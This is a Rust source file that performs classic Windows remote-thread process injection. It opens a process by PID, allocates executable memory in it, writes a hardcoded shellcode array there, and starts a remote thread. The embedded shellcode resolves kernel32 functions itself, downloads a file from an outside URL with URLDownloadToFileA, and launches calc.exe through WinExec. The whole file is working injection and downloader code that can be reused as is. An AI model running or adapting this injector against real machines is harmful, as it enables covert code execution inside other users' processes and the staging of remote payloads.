use std::{arch::asm, env, ffi::c_void, fs::File, io::Read, mem::transmute, process::exit, ptr::{self, null, null_mut}};
use anyhow::Result;
use windows::Win32::{Foundation::GetLastError, System::{Diagnostics::Debug::WriteProcessMemory, Memory::{VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}, Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS, PROCESS_VM_OPERATION, PROCESS_VM_WRITE}}};

fn main() {
    // let payload = match read_shellcode_file() {
    //     Ok(s) => s,
    //     Err(e) => panic!("[-] Unable to read shellcode from file: {e}"),
    // };

    let payload: [u8; 830] = [
        0xe9,0x6c,0x02,0x00,0x00,0x11,0x00,0x00,0x18,0x13,0x00,0x00,0x91,0x11,0x00,0x00,0x71,0x12,0x00,0x00,0x20,0x13,
        0x00,0x00,0x71,0x12,0x00,0x00,0x18,0x13,0x00,0x00,0x34,0x13,0x00,0x00,0x4b,0x00,0x45,0x00,0x52,0x00,0x4e,0x00,
        0x45,0x00,0x4c,0x00,0x33,0x00,0x32,0x00,0x2e,0x00,0x44,0x00,0x4c,0x00,0x4c,0x00,0x00,0x00,0x57,0x69,0x6e,0x45,
        0x78,0x65,0x63,0x00,0x4c,0x6f,0x61,0x64,0x4c,0x69,0x62,0x72,0x61,0x72,0x79,0x41,0x00,0x00,0x75,0x00,0x72,0x00,
        0x6c,0x00,0x6d,0x00,0x6f,0x00,0x6e,0x00,0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00,0x00,0x75,0x72,0x6c,0x6d,
        0x6f,0x6e,0x2e,0x64,0x6c,0x6c,0x00,0x55,0x52,0x4c,0x44,0x6f,0x77,0x6e,0x6c,0x6f,0x61,0x64,0x54,0x6f,0x46,0x69,
        0x6c,0x65,0x41,0x00,0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x6c,0x75,0x78,0x73,0x65,0x63,0x2e,0x72,0x65,
        0x64,0x2f,0x73,0x69,0x74,0x65,0x6d,0x61,0x70,0x2e,0x78,0x6d,0x6c,0x00,0x43,0x3a,0x5c,0x55,0x73,0x65,0x72,0x73,
        0x5c,0x69,0x61,0x6e,0x5c,0x67,0x69,0x74,0x5c,0x72,0x75,0x73,0x74,0x5f,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,
        0x65,0x5c,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x5c,0x74,0x65,0x73,0x74,0x5f,0x66,0x69,0x6c,0x65,0x5f,
        0x32,0x2e,0x78,0x6d,0x6c,0x00,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00,0x00,0x18,0x00,0x00,0x00,0x00,0x80,
        0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x56,0x65,0x48,0x8b,
        0x14,0x25,0x60,0x00,0x00,0x00,0x4c,0x8b,0x42,0x18,0x49,0x8b,0x40,0x10,0x48,0x89,0xc2,0x4c,0x8b,0x42,0x60,0x4d,
        0x85,0xc0,0x74,0x5a,0x66,0x83,0x7a,0x58,0x00,0x74,0x53,0x49,0xc7,0xc2,0xff,0xff,0xff,0xff,0x45,0x31,0xdb,0x4d,
        0x89,0xd9,0x66,0x42,0x83,0x7c,0x51,0x02,0x00,0x4d,0x8d,0x52,0x01,0x4d,0x8d,0x5b,0x01,0x75,0xec,0x49,0xc7,0xc3,
        0xff,0xff,0xff,0xff,0x66,0x43,0x83,0x7c,0x58,0x02,0x00,0x4d,0x8d,0x5b,0x01,0x75,0xf3,0x4d,0x39,0xda,0x75,0x1c,
        0x45,0x31,0xd2,0x49,0x83,0xe9,0x01,0x72,0x22,0x46,0x0f,0xb7,0x1c,0x11,0x49,0x8d,0x72,0x02,0x66,0x47,0x3b,0x1c,
        0x10,0x49,0x89,0xf2,0x74,0xe7,0x48,0x8b,0x12,0x48,0x39,0xc2,0x75,0x95,0xb8,0x78,0x56,0x34,0x12,0xeb,0x04,0x48,
        0x8b,0x42,0x30,0x5e,0xc3,0x41,0x57,0x41,0x56,0x41,0x54,0x56,0x57,0x55,0x53,0xb8,0x21,0x43,0x65,0x87,0x66,0x81,
        0x39,0x4d,0x5a,0x0f,0x85,0xb4,0x00,0x00,0x00,0x8b,0x41,0x3c,0x44,0x8b,0x8c,0x01,0x88,0x00,0x00,0x00,0x46,0x8b,
        0x44,0x09,0x18,0x42,0x8b,0x44,0x09,0x1c,0x46,0x8b,0x54,0x09,0x20,0x46,0x8b,0x4c,0x09,0x24,0x45,0x31,0xff,0x4d,
        0x39,0xc7,0x0f,0x84,0x94,0x00,0x00,0x00,0x49,0x8d,0x77,0x01,0x45,0x89,0xfb,0x43,0x8d,0x3c,0x9a,0x8b,0x3c,0x39,
        0x80,0x3c,0x39,0x00,0x49,0x89,0xf7,0x74,0xe0,0x48,0x01,0xcf,0x49,0xc7,0xc6,0xff,0xff,0xff,0xff,0x45,0x31,0xff,
        0x4c,0x89,0xfb,0x42,0x80,0x7c,0x32,0x01,0x00,0x4d,0x8d,0x76,0x01,0x4d,0x8d,0x7f,0x01,0x75,0xed,0x49,0xc7,0xc4,
        0xff,0xff,0xff,0xff,0x42,0x80,0x7c,0x27,0x01,0x00,0x4d,0x8d,0x64,0x24,0x01,0x75,0xf3,0x49,0x89,0xf7,0x4d,0x39,
        0xe6,0x75,0xa4,0x45,0x31,0xf6,0x48,0x83,0xeb,0x01,0x72,0x16,0x42,0x8a,0x2c,0x32,0x4d,0x8d,0x7e,0x01,0x42,0x3a,
        0x2c,0x37,0x4d,0x89,0xfe,0x74,0xe9,0x49,0x89,0xf7,0xeb,0x85,0x43,0x8d,0x14,0x59,0x0f,0xb7,0x14,0x11,0x81,0xe2,
        0xff,0x3f,0x00,0x00,0x8d,0x04,0x90,0x8b,0x04,0x01,0x48,0x01,0xc8,0x5b,0x5d,0x5f,0x5e,0x41,0x5c,0x41,0x5e,0x41,
        0x5f,0xc3,0xb8,0x44,0x33,0x22,0x11,0xeb,0xee,0x56,0x57,0x48,0x83,0xec,0x28,0x48,0xc7,0xc1,0x00,0x00,0x00,0x00,
        0x48,0xc7,0xc2,0x00,0x00,0x00,0x00,0x48,0x8d,0x0d,0x98,0xfd,0xff,0xff,0xe8,0x73,0xfe,0xff,0xff,0x48,0x89,0xc6,
        0x48,0x8d,0x15,0xa3,0xfd,0xff,0xff,0x48,0x89,0xc1,0xe8,0xee,0xfe,0xff,0xff,0x48,0x89,0xc7,0x48,0x8d,0x15,0x99,
        0xfd,0xff,0xff,0x48,0x89,0xf1,0xe8,0xdc,0xfe,0xff,0xff,0x48,0x8d,0x0d,0xae,0xfd,0xff,0xff,0xff,0xd0,0x48,0x8d,
        0x0d,0x8f,0xfd,0xff,0xff,0xe8,0x3a,0xfe,0xff,0xff,0x48,0x8d,0x15,0xa4,0xfd,0xff,0xff,0x48,0x89,0xc1,0xe8,0xb8,
        0xfe,0xff,0xff,0x48,0x83,0x64,0x24,0x20,0x00,0x48,0x8d,0x15,0xa2,0xfd,0xff,0xff,0x4c,0x8d,0x05,0xbb,0xfd,0xff,
        0xff,0x31,0xc9,0x45,0x31,0xc9,0xff,0xd0,0x85,0xc0,0x74,0x08,0xcc,0x48,0x83,0xc4,0x28,0x5f,0x5e,0xc3,0x48,0x8d,
        0x0d,0xdb,0xfd,0xff,0xff,0xba,0x01,0x00,0x00,0x00,0x48,0x89,0xf8,0x48,0x83,0xc4,0x28,0x5f,0x5e,0x48,0xff,0xe0,
        0x01,0x01,0x01,0x00,0x01,0x60,0x00,0x00,0x01,0x0a,0x07,0x00,0x0a,0x30,0x09,0x50,0x08,0x70,0x07,0x60,0x06,0xc0,
        0x04,0xe0,0x02,0xf0,0x00,0x00,0x01,0x06,0x03,0x00,0x06,0x42,0x02,0x70,0x01,0x60
        ];

    let pid = collect_proc_addr();

    // ####################################################
    // GET HANDLE TO REMOTE PROCESS
     let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
     let h_process = match h_process {
         Ok(h) => {
             println!("[+] Got handle to process ID {pid}, handle: {:?}", h);
             h // return the handle
         },
         Err(e) => panic!("[-] Could not get handle to pid {pid}, error: {e}"),
     };

     let payload_len = payload.len();
     let payload_ptr: *const c_void = payload.as_ptr() as *const c_void;

    unsafe {
        // ####################################################
        // ALLOCATE MEMORY IN REMOTE PROCESS

        let remotememory_ptr: *mut c_void = VirtualAllocEx(h_process, None, payload_len, 
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if remotememory_ptr.is_null() {
            panic!("[-] Did not create memory. {:?}", GetLastError());
        }
        println!("[+] Allocated memory address: {:p}", remotememory_ptr);


        // ####################################################
        // WRITE PROCESS MEMORY

        let result_writeprocessmemory = WriteProcessMemory(h_process, 
            remotememory_ptr, payload_ptr, payload_len, None);

        if let Err(e) = result_writeprocessmemory {
            panic!("[-] Error writing process memory {e}");
        }
        println!("[+] Successfully wrote process memory.");


        // ####################################################
        // INJECT VIA CREATE REMOTE THREAD
        
        let result_createremotethread = CreateRemoteThread(
            h_process, 
            None, 
            0, 
            transmute(remotememory_ptr), 
            None, 
            0, 
            None
        );

        match result_createremotethread {
            Ok(_) => println!("[+] Thread created"),
            Err(e) => eprintln!("[-] Error creating thread {e}"),
        }
    }
}

/// Get the pid from the command line when the user starts the program
fn collect_proc_addr() -> u32 {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        eprintln!("[-] PID required.");
        exit(1);
    }

    let pid = args[1].clone();
    let pid_as_int: u32 = pid.parse().unwrap();

    pid_as_int
}

/// If not hard coding shellcode, read from specified file.
fn read_shellcode_file() -> Result<Vec<u8>> {
    let mut shellcode_file = File::open(r"C:\Users\ian\git\rust_shellcode\builder\output\shellcode.bin")?;
    let mut shellcode_buffer = Vec::new();
    shellcode_file.read_to_end(&mut shellcode_buffer)?;

    Ok(shellcode_buffer)
}